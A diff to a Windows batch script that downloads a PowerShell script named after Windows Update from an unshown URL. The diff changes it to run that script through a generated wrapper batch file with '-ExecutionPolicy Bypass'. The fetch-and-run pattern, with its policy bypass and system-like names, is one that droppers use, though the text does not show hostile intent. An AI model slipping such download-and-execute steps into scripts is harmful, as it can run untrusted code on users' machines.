@@ -13,6 +13,9 @@ set "script_name=Windows_Update_Notification_Script.ps1"
 :: Define the full path to the downloaded script
 set "downloaded_script=%script_dir%%script_name%"
 
+:: Define the path for the "Windows_Update_Check.bat" script
+set "bat_script=%script_dir%Windows_Update_Check.bat"
+
 :: Create the directory if it doesn't exist
 if not exist "%script_dir%" (
     mkdir "%script_dir%"
@@ -25,8 +28,13 @@ powershell -command "(New-Object System.Net.WebClient).DownloadFile('%script_url
 if !errorlevel! equ 0 (
     echo Downloaded script to %downloaded_script%
     
-    :: Run the PowerShell script with bypassing the execution policy
-    powershell -ExecutionPolicy Bypass -File "%downloaded_script%"
+    :: Create the "Windows_Update_Check.bat" script
+    echo @echo off > "%bat_script%"
+    echo PowerShell.exe -ExecutionPolicy Bypass -File "%downloaded_script%" >> "%bat_script%"
+    echo Batch script "Windows_Update_Check.bat" created.
+    
+    :: Run the "Windows_Update_Check.bat" script
+    call "%bat_script%"
     
     echo Script execution complete.
 ) else (
